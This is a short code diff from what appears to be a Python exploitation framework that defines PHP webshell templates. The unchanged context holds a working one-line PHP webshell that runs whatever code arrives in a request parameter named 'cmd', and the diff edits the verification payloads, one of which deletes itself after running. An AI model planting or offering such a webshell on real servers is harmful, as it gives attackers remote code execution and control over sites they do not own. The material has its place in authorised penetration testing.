@@ -141,9 +141,9 @@ class PhpShell(Webshell):
     _keyword = randomStr(20)
     _password = 'cmd'
     _content = "<?php @assert($_REQUEST['{0}']);?>"
-    _check_statement = 'var_dump(md5(' + _keyword + '));'
+    _check_statement = 'var_dump("' + _keyword + '");'
 
 
 class PhpVerify(VerifyShell):
     _keyword = randomStr(20)
-    _content = "<?php var_dump(md5(" + _keyword + "));unlink(__FILE__);?>"
+    _content = "<?php var_dump('" + _keyword + "');unlink(__FILE__);?>"
